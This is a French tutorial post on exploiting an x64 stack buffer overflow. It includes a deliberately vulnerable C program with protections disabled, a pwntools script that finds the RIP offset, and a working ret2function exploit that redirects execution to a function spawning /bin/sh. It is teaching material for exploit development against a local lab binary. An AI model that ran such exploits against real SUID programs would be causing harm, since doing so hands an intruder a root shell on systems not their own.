---
title: "Détournement de fonction"
date: 2026-05-20 12:00:00 +0200
categories: [Cybersécurité, Documentation, x64, Stack Exploitation]
tags: [pwn, mémoire, exploit]
---
#### Détournement de fonction tiers SANS protection

Avant de détailler comment exploiter une faille typique de ce genre il est important de rappeler ce qu'est un Stack Buffer Overflow aussi appelé BoF :

Un Stack Buffer Overflow est une vulnérabilité résultant d'un dépassement d'écriture dans un buffer situé sur la stack, ce résultat permet ainsi l'écriture de données arbitraires directement dans la stack et plus précisément par dessus des informations servant au bon déroulement du control flow du programme. Un Stack Buffer Overflow basique permet d'écrire par dessus le registre RIP (registre contenant l'adresse exécutant la prochaine instruction du programme) et ainsi contrôler l'entiereté du programme.

Voici un premier programme écrit en C basique, contenant une fonction admin_only() dont un utilisateur lambda n'aurait pas la possibilité d'appeler :

```
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

void admin_only() {
    system("/bin/sh");
}

void vulnerable_function() {
    char buffer[64];

    ssize_t n = read(0, buffer, 256);
}

int main() {
    vulnerable_function();
    return 0;
}

//compilé via la commande : gcc -fno-stack-protector -z execstack -no-pie -o Stack_Buffer_Overflow_ret2function Stack_Buffer_Overflow_ret2function.c 

```

La vulnérabilité ici est assez simple à comprendre, dans la fonction vulnerable_function(), un buffer d'une taille de 64 octets est défini, ensuite un read de l'entrée utilisateur est effectuée mais celle-ci lit jusqu'à 256 octets ce qui dépasse la taille du buffer. Nous avons ainsi 192 octets disponibles que nous pouvons utiliser pour écrire dans la stack, Mais avant cela il est plus qu'essentiel de savoir où se trouve le registre RIP après l'adresse du buffer dans la stack, dans un environnement très limité, la taille serait fixe c'est-à-dire :

* 64 octets pour remplir le buffer
* 8 octets pour écrire dans RBP
* 8 octets pour écrire dans RIP

Malheureusement, dans une exploitation réaliste, l'environnement de la machine ne permettra pratiquement jamais de connaître l'offset à l'avance car le compilateur du programme ajoute souvent du remplissage pour aligner la pile, ainsi que certaines fonctions qui attendent un alignement sur 16 octets ou 8 octets. Les variables d'environnement peuvent aussi décaler les offsets car elles se trouvent bien souvent sur la stack.

Afin d'exploiter ce Stack Buffer Overflow basique il est importer tout d'abord de comprendre ce que nous voulons exploiter et pour obtenir quel résultat :

* Exploiter l'overflow du buffer pour contrôler le registre RIP
* Appeler la fonction admin_only() qui n'est normalement pas possible d'accès
* obtenir un shell avec les permissions du propriétaire du programme (généralement bit de suid sur le binaire exploité)

Comme mentionné précédemment en écrivant dans le registre RIP nous contrôlons l'entiereté du flux du programme, le registre RIP comme tout registre attendant une adresse il va falloir tout d'abord récupérer l'adresse de début de la fonction ciblée. Comme il n'y'a pas de protections, il est très facile de connaître l'adresse de début de la fonction, voici quelques manières simples de procéder :

* utilisation d'une commande dans le terminal (le plus simple et rapide) : nm Stack_Buffer_Overflow_ret2function | grep "admin_only" --> 0000000000401136
* utilisation de gdb si le binaire n'est pas strippé, en faisant un disassemble du nom de la fonction nous voyons l'entiereté du code assembleur ainsi que l'adresse de début

Maintenant nous avons besoin de connaître l'offset jusqu'au registre RIP, comme dit précédemment sa taille peut varier dû à l'environnement dans lequel l'utilisateur se trouve, voici donc un petit programme via la librairie pwntools qui permet de connaître l'offset dynamiquement :

```
from pwn import *
import os

# On définit le binaire
exe = context.binary = ELF('./Stack_Buffer_Overflow_ret2function')

# On lance le processus
p = process(exe.path)

# On envoie un pattern cyclique long (128 octets)
p.sendline(cyclic(128))

# On attend que le processus crash
p.wait()

# On récupère le corefile généré en mémoire
core = p.corefile

# On cherche la valeur qui était dans RSP au moment du crash (en x64)
# car RIP a essayé de sauter sur cette valeur depuis la pile
stack_value = core.read(core.rsp, 8)
offset = cyclic_find(stack_value)

print(f"L'offset exact est : {offset}")

# On supprime le fichier temporaire crée par pwntools au moment du crash
os.remove(core.file.name)

p.close()
```

Dans le cas de mon environnement, grâce à ce programme j'obtiens un offset de 88 octets avant l'écriture dans le registre RIP, il reste cependant une dernière chose permettant d'assurer le bon fonctionnement de l'exploit, ayant parlé précédemment d'alignement de la pile selon certaines fonctions, la fonction system() utilisée dans le programme en fait partie, elle attend un alignement de 16 octets, afin d'éviter de faire planter le programme il est toujours utile et parfois nécessaire d'ajouter un ret, cette instruction décale ainsi la pile de 8 octets et permet de rétablir la mémoire. L'utilisation d'une instruction à part s'appelle un gadget, voici deux manières simples de trouver l'adresse d'un gadget dans le programme et parfois, si un linker dynamique est lié au programme, dans la mémoire de celui-ci :

* via l'outil ROPgadget : ROPgadget --binary Stack_Buffer_Overflow_ret2function | grep "ret" --> on obtient un simple gadget ret ici : 0x0000000000401016 : ret
* via la librairie pwntools, celle-ci possède un module intégré permettant de rechercher directement des gadgets dans le programme (montré dans le programme d'exploitation)

Il ne reste désormais plus qu'à exploiter l'entiereté des informations trouvées afin de créer un programme qui enverra notre payload au binaire et nous permettra d'exécuter la fonction reservée :

```
from pwn import *

# On définit le binaire
exe = ELF('./Stack_Buffer_Overflow_ret2function')

# On lance le processus
p = process(exe.path)

# On retrouve l'adresse de la fonction admin_only à partir des symbols du binaire via pwntools
system_addr = exe.symbols['admin_only']

# On définit le module ROP qui permettra la recherche de gadgets
rop = ROP(exe)

# On cherche un gadget 'ret' et on stocke son adresse
ret_gadget = rop.find_gadget(['ret'])[0]

# On crée la payload que nous allons envoyer
payload = b"A" * 88
payload += p64(ret_gadget)
payload += p64(system_addr)

p.sendline(payload)

# On laisse le processus ouvert pour garder l'ouverture de notre shell
p.interactive()
```

Une fois executée, nous obtenons ainsi un shell propre nous permettant d'exécuter des commandes avec les permissions du propriétaire du programme (dans un cas réaliste, le propriétaire est en général l'utilisateur root).
